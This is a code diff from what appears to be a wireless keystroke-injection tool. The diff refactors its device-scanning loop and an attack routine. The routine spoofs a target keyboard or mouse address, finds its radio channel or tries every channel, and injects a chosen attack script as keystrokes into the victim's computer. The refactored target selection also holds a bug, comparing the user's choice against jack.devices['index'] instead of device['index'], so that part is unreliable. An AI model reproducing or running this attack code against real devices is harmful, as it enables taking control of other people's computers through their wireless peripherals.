@@ -26,6 +26,67 @@ C = '\033[36m'  # cyan
 GR = '\033[37m'  # gray
 
 
+def launch_attacks(jack, targets, attack):
+    for _, target in targets.iteritems():
+        payload  = target['payload']
+        channels = target['channels']
+        address  = target['address']
+        hid      = target['device']
+
+        # Sniffer mode allows us to spoof the address
+        jack.sniffer_mode(address)
+
+        if hid:
+            # Attempt to ping the devices to find the current channel
+            lock_channel = jack.find_channel(address)
+
+            if lock_channel:
+                print(GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,))
+                print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), hid.description(), lock_channel))
+                jack.attack(hid(address, payload), attack)
+            else:
+                # If our pings fail, go full hail mary
+                print(R + '[-] ' + W + 'Ping failed, trying all channels')
+                for channel in channels:
+                    jack.set_channel(channel)
+                    print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), hid.description(), channel))
+                    jack.attack(hid(address, payload), attack)
+        else:
+            print(R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.hexify(address)))
+            continue
+
+def scan_loop(jack, interval, targeted, address):
+    if targeted:
+        jack.sniff(interval, address)
+    else:
+        jack.scan(interval)
+
+    click.clear()
+    if targeted:
+        print(GR + "[+] " + W + ("Sniffing for %s every %ds " % (address, interval)) + G + "CTRL-C " + W + "when ready.")
+    else:
+        print(GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready.")
+    print("")
+
+    pretty_devices = []
+    for addr, device in jack.devices.iteritems():
+        if device['device']:
+            device_name = device['device'].description()
+        else:
+            device_name = 'Unknown'
+        pretty_devices.append([
+            device['index'],
+            addr,
+            ",".join(str(x) for x in device['channels']),
+            device['count'],
+            str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
+            device_name,
+            jack.hexify(device['payload'])
+        ])
+
+    print(tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"]))
+
+
 def _print_err(text):
     print(R + '[!] ' + W + text)
 
@@ -120,43 +181,12 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
             print(G + "[+] " + W + 'Starting scan...')
 
         try:
-            # Enter main loop
             while True:
-                if targeted:
-                    devices = jack.sniff(interval, address)
-                else:
-                    devices = jack.scan(interval)
-
-                click.clear()
-                if targeted:
-                    print(GR + "[+] " + W + ("Sniffing for %s every %ds " % (address, interval)) + G + "CTRL-C " + W + "when ready.")
-                else:
-                    print(GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready.")
-                print("")
-
-                idx = 0
-                pretty_devices = []
-                for key, device in devices.iteritems():
-                    idx = idx + 1
-                    if device['device']:
-                        device_name = device['device'].description()
-                    else:
-                        device_name = 'Unknown'
-                    pretty_devices.append([
-                        idx,
-                        key,
-                        ",".join(str(x) for x in device['channels']),
-                        device['count'],
-                        str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
-                        device_name,
-                        jack.hexify(device['payload'])
-                    ])
-
-                print(tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"]))
+                scan_loop(jack, interval, targeted, address)
         except KeyboardInterrupt:
-            print("")
+            print()
 
-        if 'devices' not in locals() or len(devices) == 0:
+        if len(jack.devices) == 0:
             _print_err("No devices found please try again...")
             exit(-1)
 
@@ -164,52 +194,23 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
             _print_err("No attack script was provided...")
             exit(-1)
 
-        print(GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + " separated by commas, or '%s': " % (G + 'all' + W), end="")
+        print(GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(jack.devices)) + W) + " separated by commas, or '%s': " % (G + 'all' + W), end="")
         value = click.prompt('', default="all")
         value = value.strip().lower()
 
         if value == "all":
-            victims = pretty_devices[:]
+            targets = jack.devices
         else:
-            victims = []
+            targets = {}
             for vic in value.split(","):
-                if int(vic) <= len(pretty_devices):
-                    victims.append(pretty_devices[(int(vic) - 1)])
+                if int(vic) <= len(jack.devices):
+                    for addr, device in jack.devices.iteritems():
+                        if int(vic) == jack.devices['index']:
+                            targets[addr] = device
                 else:
-                    _print_err(("Device %d key is out of range" % int(vic)))
+                    _print_err("Device %d key is out of range" % int(vic))
 
-        targets = []
-        for victim in victims:
-            if victim[1] in devices:
-                targets.append(devices[victim[1]])
-
-        for target in targets:
-            payload  = target['payload']
-            channels = target['channels']
-            address  = target['address']
-            hid      = target['device']
-
-            # Sniffer mode allows us to spoof the address
-            jack.sniffer_mode(address)
-
-            if hid:
-                # Attempt to ping the devices to find the current channel
-                lock_channel = jack.find_channel(address)
-
-                if lock_channel:
-                    print(GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,))
-                    print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), hid.description(), lock_channel))
-                    jack.attack(hid(address, payload), attack)
-                else:
-                    # If our pings fail, go full hail mary
-                    print(R + '[-] ' + W + 'Ping failed, trying all channels')
-                    for channel in channels:
-                        jack.set_channel(channel)
-                        print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), hid.description(), channel))
-                        jack.attack(hid(address, payload), attack)
-            else:
-                print(R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.hexify(address)))
-                continue
+        launch_attacks(jack, targets, attack)
 
         print(GR + '\n[+] ' + W + "All attacks completed\n")
 
